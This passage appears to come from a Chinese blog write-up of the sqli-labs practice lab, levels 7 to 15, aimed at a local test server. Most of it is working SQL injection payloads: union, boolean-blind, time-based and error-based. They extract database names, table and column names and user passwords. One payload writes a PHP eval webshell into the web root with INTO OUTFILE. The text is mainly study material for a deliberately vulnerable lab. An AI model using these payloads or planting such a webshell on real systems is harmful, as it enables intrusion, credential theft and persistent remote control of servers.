<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-7/?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"D:\\phpStudy\\WWW\\sqli-labs-master\\Less-7\\uuu.txt"</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/23.png" alt></p>
<p>图中显示sql出错但是在文件中还是创建了uuu.txt文件。</p>
<p><strong>ps:若无法生成文件，需要将my.ini配置文件中的secure_file_priv选项设置为空，若无该选项则添加设置secure_file_priv=’’</strong></p>
<p><img src="/2019/12/27/sqli-labs-writeup/24.png" alt></p>
<p>测试完成则将一句话木马放进去</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-7/?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_post["mima"]) ?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"D:\\phpStudy\\WWW\\sqli-labs-master\\Less-7\\yijuhua.php"</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/25.png" alt></p>
<p>当访问页面时，一句话没有显示</p>
<p><img src="/2019/12/27/sqli-labs-writeup/26.png" alt></p>
<p>然后使用菜刀进行连接。</p>
<h4 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h4><p>通过测试发现<code>or 1=1 -- +</code>返回正常，参考less5的playload进行注入</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-8</span>/?id=<span class="number">1</span><span class="string">' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) -- +   //数据库名第一位为s</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-8/?id=1'</span> <span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr(<span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>，<span class="number">1</span>，sleep(<span class="number">5</span>)) <span class="comment">-- +  //数据库名第二位为e</span></span><br></pre></td></tr></table></figure>

<p>测试发现可以使用延时注入，并查看less8的源码得到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">	<span class="comment">//echo 'You are in...........';</span></span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>在源码中发现当数据库查询发生错误时，没有输出任何的报错信息，也就是与less5相比，我们无法使用报错注入的方式。其余playload与less5一致。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-8</span>/?id=<span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80 -- + //返回是正确的，测试至101开始报错，说明security库下第一个表的第一个字符为e</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-8/?id=1'</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">80</span> <span class="comment">-- +  //返回正确，测试至109报错，得到第二个字符为m</span></span><br><span class="line"></span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-8</span>/?id=<span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;80 -- +  //返回正确，测试至114开始报错，说明security下第二个表的第一个字符为r</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-8/?id=1'</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span> <span class="keyword">and</span> <span class="built_in">column_name</span> regexp <span class="string">'^us[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) <span class="comment">-- +  //查询user表中的列名是否有us**的列</span></span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-8</span>/?id=<span class="number">1</span><span class="string">' and 1=(select 1 from information_schema.columns where table_name='</span>users<span class="string">' and column_name regexp '</span>^usernam<span class="string">e' limit 0,1)-- +  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-8/?id=1'</span> <span class="keyword">and</span> ord(mid((<span class="keyword">select</span> ifnull(cast(username <span class="keyword">as</span> <span class="type">char</span>),<span class="number">0x20</span>) <span class="keyword">from</span> <span class="keyword">security</span>.users <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span> <span class="comment">-- +   //获取表中的内容，获取username中第一行的第一个字符的ascii，与68进行比较即为D，然后差不多都是直接重复上面换字符位置的查询操作</span></span><br></pre></td></tr></table></figure>

<h4 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h4><p>在连接的标题看到该关卡是关于<strong>基于时间-单引号</strong>的注入方式，明显是需要通过延迟注入，同时将对参数id进行<code>&#39;</code>进行处理。既然前面已经有延时注入的方式，所以这边直接贴playload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">猜测数据库名</span><br><span class="line">http://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) <span class="comment">-- + //说明第一位是s (ascii为115)</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),2,1))=101,1,sleep(5)) <span class="comment">-- + //说明第二位是e</span></span><br><span class="line">......</span><br><span class="line">以此类推，得到数据库名为security</span><br><span class="line"></span><br><span class="line">猜测security的数据表</span><br><span class="line">http://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)) <span class="comment">-- + //猜测第一个数据表的第一位为e，以此类推得到emails</span></span><br><span class="line"><span class="keyword">http</span>://localhost/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-9</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and if(ascii(substr((select table_name from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">' limit 1,1),1,1))=114,1,sleep(5))-- +  //猜测第二个数据表emails,referers, uagents,users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测users表的列</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-9/?id=1'</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)) <span class="comment">-- +   //猜测users表的第一列的第一个字符是i，然后以此类推得到列名为  id，username，password</span></span><br><span class="line"></span><br><span class="line">猜测username的值</span><br><span class="line"><span class="keyword">http</span>://localhost/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-9</span>/?<span class="keyword">id</span>=<span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)) <span class="comment">-- +   //猜测username的第一行的第一位   以此类推得到数据库username，password的所有内容</span></span><br></pre></td></tr></table></figure>

<p>上述过程就是通过延时注入的全部过程，当然也可以使用benchmark（）函数进行注入。</p>
<h4 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h4><p>标题提示<strong>基于时间-双引号</strong>，与less9一样，该关卡使用的是延时注入的方式，区别在于less9对id进行的是单引号处理，而这边是使用双引号处理。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜测数据库名</span><br><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">10</span><span class="regexp">/?id=1" and if(ascii(substr(database(),1,1))=115,1,sleep(5)) -- +</span></span><br></pre></td></tr></table></figure>

<p>其余的playload参考less9的内容一样</p>
<h4 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h4><p>这边开始要通过post提交数据，post就是将数据从客户端提交到服务器端。例如下面这个界面，通过界面输入用户名和密码，用户名和表单以表单的形式提交，提交到服务器后服务器再进行验证。这就是一个post的过程。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/27.png" alt></p>
<p>进行post注入有两种方式进行，一种是直接在页面进行传输数据，但是这样比较不直观，另一种是使用burpsuite进行报文拦截然后进行修改发送，比较直观。使用burpsuite拦截本地主机报文需要进行设置。(以Google chrome为例)</p>
<ul>
<li><p>在代理插件处将不拦截报文的地址将内容删除</p>
<p><img src="/2019/12/27/sqli-labs-writeup/28.png" alt></p>
</li>
<li><p>将Internet选项中的连接-》局域网设置中的代理服务器进行设置，如下</p>
<p><img src="/2019/12/27/sqli-labs-writeup/29.png" alt></p>
</li>
<li><p>查看本地ip地址，将浏览器中的localhost该ip地址</p>
<p><img src="/2019/12/27/sqli-labs-writeup/30.png" alt></p>
<p><img src="/2019/12/27/sqli-labs-writeup/31.png" alt></p>
</li>
</ul>
<p>就可以使用burpsuite的报文</p>
<p><img src="/2019/12/27/sqli-labs-writeup/32.png" alt></p>
<p>由上面这张图可以看到通过post传输的参数共有三个</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span>&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p>其中键入的数据的变量为uname和passwd，通过像get参数传输的注入方式进行post注入，例如：</p>
<pre><code>uname:admin&apos; 
passwd:  111(随便输入)</code></pre><p>数据库进行了报错回显，通过报错信息我们发现sql查询语句进行了单引号处理</p>
<p>传入参数：uname:admin’# 密码随意</p>
<p><img src="/2019/12/27/sqli-labs-writeup/33.png" alt></p>
<p>发现直接将用户名密码查询出来了，username：admin  password：admin。当提交username和password后，后台形成的sql语句为</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">username</span>=<span class="string">'admin'</span>#' <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">'$passwd'</span> LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p><strong>#</strong>将admin后面的内容注释掉，而在数据库中包含admin用户名所以语句成立，此时就使用admin进行了登录，然后尝试使用get注入中用到的其他语句进行代替or 1=1进行注入。</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">username: <span class="number">1</span>admin'<span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>()<span class="meta">#</span></span><br><span class="line">passwd: 任意密码</span><br><span class="line"><span class="comment">//得到数据库名称为security</span></span><br><span class="line"></span><br><span class="line">username: <span class="number">1</span>admin' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">group_concat</span>(table_name) from information_schema.tables <span class="built_in">where</span> table_schema='security'<span class="meta">#</span></span><br><span class="line">passwd:任意密码</span><br><span class="line"><span class="comment">//得到数据库内的所有表名emails,referers,uagents,user</span></span><br><span class="line"></span><br><span class="line">username:<span class="number">1</span>admin' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">group_concat</span>(column_name) from information_schema.columns <span class="built_in">where</span> table_name='users'<span class="meta">#</span></span><br><span class="line">passwd：任意</span><br><span class="line"><span class="comment">//得到users表中的列名：id,username,password</span></span><br><span class="line"></span><br><span class="line">username:<span class="number">1</span>admin' <span class="built_in">union</span> <span class="built_in">select</span> username,password from users <span class="built_in">where</span> id=<span class="number">3</span><span class="meta">#</span></span><br><span class="line">passwd:任意密码</span><br><span class="line"><span class="comment">//得到任意用户的用户名和密码</span></span><br></pre></td></tr></table></figure>

<h4 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h4><p>当键入username:admin’      passwd:1 没有任何的报错回显，</p>
<p>尝试双引号，即username：admin”        passwd:1</p>
<p>错误回显发现<strong>1”) LIMIT 0,1</strong>，发现在参数进行了处理将username进行了处理，需要增加<strong>）</strong>。</p>
<p>所以参照less11构造相关的查询语句变量</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">username:<span class="number">1</span><span class="keyword">admin</span>") union select 1,database()#</span><br><span class="line">passwd:任意</span><br><span class="line">//获得数据库名security</span><br><span class="line"></span><br><span class="line">username:1admin") <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span>#</span><br><span class="line">passwd: 任意</span><br><span class="line">//获得表名emails,referers,uagents,users</span><br><span class="line"></span><br><span class="line">username:<span class="number">1</span><span class="keyword">admin</span>") union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#</span><br><span class="line">passwd:任意</span><br><span class="line">//获得列名id,username,password</span><br><span class="line"></span><br><span class="line">username:1admin") <span class="keyword">union</span> <span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="number">3</span>#</span><br><span class="line">passwd:任意</span><br><span class="line">//可查询所有用户信息</span><br></pre></td></tr></table></figure>

<h4 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h4><p>键入变量值：username: admin’     password:  1(任意)</p>
<p>获得报错信息<strong>1’) LIMIT 0,1</strong>可知是username进行了<strong>‘）</strong>处理，将参数增加<strong>）</strong>进行注入尝试，username: admin’) #  password: 1</p>
<p>发现回显的只有成功登录的信息，没有返回的用户信息，这样就只能使用布尔盲注进行。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">uname:<span class="keyword">admin</span><span class="string">') and length(database())=8#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//猜测数据库名长度为8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span>) <span class="keyword">and</span> left(<span class="keyword">database</span>,<span class="number">1</span>)&gt;<span class="string">'a'</span>#</span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//猜测数据库名的第一位为s</span><br><span class="line"></span><br><span class="line">uname:<span class="keyword">admin</span><span class="string">') and left(database(),2)&gt;'</span>sa<span class="string">'#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//猜测数据库的第二位为se</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">逐步猜测数据库名为security</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span>) <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span>#</span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//猜测数据库<span class="keyword">security</span>下第一个表名的第一个字符 第一个应为<span class="number">101</span>-》e</span><br><span class="line">uname:<span class="keyword">admin</span><span class="string">') and ascii(substr((select table_name from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">' limit 0,1),2,1))&gt;108#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//猜测数据库security下第一个表名的第二个字符 第二个为108-》m</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">得到数据库security下第一个表名的全程为email</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span>) <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">113</span>#</span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//得到数据库<span class="keyword">security</span>下第二个表名的第一个字符 <span class="number">113</span>—》r</span><br><span class="line"></span><br><span class="line">uname=<span class="keyword">admin</span><span class="string">') and 1=(select 1 from information_schema.columns where table_name='</span>users<span class="string">' and table_name regexp '</span>^us[a-z]<span class="string">' limit 0,1)#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//regexp获取users表中的列名，是否有us**列</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">查询出users表中的列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span>) <span class="keyword">and</span> ord(mid((<span class="keyword">select</span> ifnull(cast(username <span class="keyword">as</span> <span class="type">char</span>),<span class="number">0x20</span>)<span class="keyword">from</span> <span class="keyword">security</span>.users <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>#</span><br><span class="line">//利用ord()和mid()函数获取users表中的内容，获取username中的第一行的第一个字符的ascii，与<span class="number">68</span>进行比较即为D，而第一行的数据是Dumb。</span><br></pre></td></tr></table></figure>

<h4 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h4><p>使用uname:admin’    passwd:1尝试发现不行，然后使用uname:admin”   passwd:1发现有了报错回显，根据错误显示，对username进行了<strong>”</strong>处理。</p>
<p>uname:admin”#    passwd:1   成功登陆后发现与less13一样，没有用户信息返回，使用盲注的方式就行注入。</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname:admin<span class="string">" and length(database())=8#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line"><span class="comment">//测试数据库名长度为8</span></span><br></pre></td></tr></table></figure>

<p>其余参考less13，只需将<strong>‘)</strong>改为<strong>“</strong>就行了</p>
<p>也可使用报错注入的方式。</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>:admin" and extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select <span class="variable">@@version</span>),<span class="number">0</span>x7e))#</span><br><span class="line"><span class="attribute">passwd</span>:<span class="number">1</span></span><br><span class="line"><span class="comment">//获取数据库版本号</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/34.png" alt></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">uname:<span class="keyword">admin</span>" and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span><br><span class="line">passwd:1</span><br><span class="line">//获取数据库名security</span><br><span class="line"></span><br><span class="line">uname:admin" <span class="keyword">and</span> rxtractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))#</span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//获取数据库<span class="keyword">security</span>下的第一个表名为email</span><br><span class="line">//本想回去获取所有表名的，使用<span class="keyword">admin</span>“ <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'users'</span>),<span class="number">0x7e</span>))#</span><br><span class="line">//发现返回的错误是Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="keyword">row</span>并没有获取到相应的信息</span><br><span class="line">uname:<span class="keyword">admin</span>" and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='users' limit 1,1),0x7e))#</span><br><span class="line">passwd:1</span><br><span class="line">//获取数据库security下第二个表名为referers</span><br><span class="line">......</span><br><span class="line">重复构造相应的轮子至使所有的表格注入出来</span><br><span class="line"></span><br><span class="line">uname:admin" <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))#</span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//获取users表中第一列的列名id</span><br><span class="line">以此类推，将所有列名注入出来</span><br><span class="line"></span><br><span class="line">uname:<span class="keyword">admin</span>" and extractvalue(1,concat(0x7e,(select username from users where id=3),0x7e))#</span><br><span class="line">passwd:1</span><br><span class="line">//注出id=3的用户名</span><br><span class="line">uname:admin" <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="number">3</span>),<span class="number">0x7e</span>))#</span><br><span class="line">//注出id=<span class="number">3</span>的密码</span><br></pre></td></tr></table></figure>

<h4 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h4><p>本关卡通过<code>admin&#39;</code>和<code>admin&quot;</code>进行都没有任何的错误返回，查看源码得到sql查询语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql="<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'$uname'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$passwd'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>获知对uname进行单引号处理，同时无法使用报错注入的方式，可以使用延时注入。</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname:admin' <span class="keyword">and</span> <span class="keyword">if</span>(<span class="built_in">ascii</span>(<span class="built_in">substr</span>(<span class="built_in">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,<span class="built_in">sleep</span>(<span class="number">5</span>))<span class="meta">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">uname；admin' <span class="keyword">and</span> <span class="keyword">if</span>(<span class="built_in">ascii</span>(<span class="built_in">substr</span>(<span class="built_in">database</span>(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="built_in">sleep</span>(<span class="number">5</span>))<span class="meta">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line"><span class="comment">//逐步猜测出数据库名为security</span></span><br></pre></td></tr></table></figure>

<p>当正确时可以直接登录，不正确则会延迟5秒</p>
